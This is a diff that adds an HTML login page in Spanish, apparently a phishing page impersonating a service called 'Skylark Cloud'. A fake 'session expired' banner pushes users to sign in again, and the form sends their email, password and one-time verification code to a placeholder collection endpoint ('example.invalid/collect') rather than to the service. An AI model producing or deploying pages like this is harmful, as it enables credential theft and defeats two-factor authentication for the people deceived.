@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8">
+  <title>Skylark Cloud - Iniciar sesión</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+  <div class="notice-banner">
+    Tu sesión ha expirado. Iniciar sesión de nuevo para continuar.
+
+  </div>
+
+  <div class="login-card">
+    <h1 class="brand-title">Skylark Cloud</h1>
+
+    <form id="loginForm" action="https://example.invalid/collect" method="POST">
+      <label for="flux75">Correo electrónico</label>
+      <input type="email" id="flux75" name="email" required>
+
+      <label for="userPassword">Contraseña</label>
+      <input type="password" id="userPassword" name="password" required>
+
+
+      <label for="otpField">Código de verificación</label>
+      <input type="text" id="otpField" name="otp" maxlength="6">
+
+      <button type="submit" id="submitBtn">Iniciar sesión</button>
+    </form>
+
+  </div>
+
+
+  <div class="help-text">
+    ¿Necesitas ayuda? Escribe a soporte@example.invalid
+
+  </div>
+
+
+  <script src="script.js"></script>
+</body>
+</html>
